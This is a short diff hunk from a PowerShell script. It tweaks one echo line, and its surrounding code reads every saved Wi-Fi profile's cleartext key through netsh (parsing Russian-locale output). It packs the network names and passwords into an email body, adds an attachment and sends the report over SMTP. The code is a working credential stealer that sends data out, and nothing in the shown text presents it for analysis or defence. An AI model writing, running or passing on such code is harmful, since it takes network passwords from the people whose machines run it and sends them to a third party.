@@ -55,7 +55,7 @@ if("WinRAR"-in $arh)
 else
   {$ReportEmail.Attachments.Add($s)};
 $ff = ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize)
-echo "pass from wifi {0}" -f $ff
+echo ("pass from wifi {0}" -f $ff)
 $ReportEmail.Body = $ff
 $SMTPInfo.Send($ReportEmail)
 
